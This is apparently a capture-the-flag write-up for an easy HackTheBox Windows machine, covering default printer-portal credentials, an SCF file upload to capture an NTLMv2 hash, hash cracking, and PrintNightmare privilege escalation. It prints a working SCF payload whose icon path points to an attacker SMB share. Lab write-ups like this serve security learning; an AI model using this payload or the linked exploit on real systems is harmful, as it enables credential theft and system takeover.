# Summary -
Easy rated Windows machine from Hackthebox. Pretty fun... Have to use scf attacks for initial access and then printnightmare for privilege escalation.

# Enumeration -
nmap, here we go...

Couple of ports are open. The one we might find interesting are port 80 http and port 5985 winrm.
Nmap says there is some login portal on port 80.

After one quick search for default creds, I got it right away which are **admin:admin**. Also, this is some kind of printer page... So, maybe printnightmare? Let's try...

![printnightmare](3.png)

And it is indeed vulnerable to printnightmare but we need initial access to use it. So, let's continue with the creds we found...

Let's login and check what's in there. Looks like we can upload files and the team on the box will do some testing...
Tried a couple of things but no luck then came accross srf attacks. Let's try to do srf attack and see if we can get some connection back.

```srf
[Shell]
Command=2
IconFile=\\10.10.14.111\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

[srf_attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-files)

And yeah, we got connection back to responder with ntlmv2 hash. Let's try to crack it using hashcat.

Cool, we got creds for tony which are **tony:\<redacted\>**.

Let's login as tony using evil-winrm.

# Post Exploitation -
Remember, we tried to check it for printnightmare and indeed it is vulnerable. So, let's exploit it.

Let's grab that exploit, transfer it to victim and get root.

_[cve-2021-34527](https://github.com/JohnHammond/CVE-2021-34527)_

Let's try winrm as our new local admin user.

And we owned this. :D
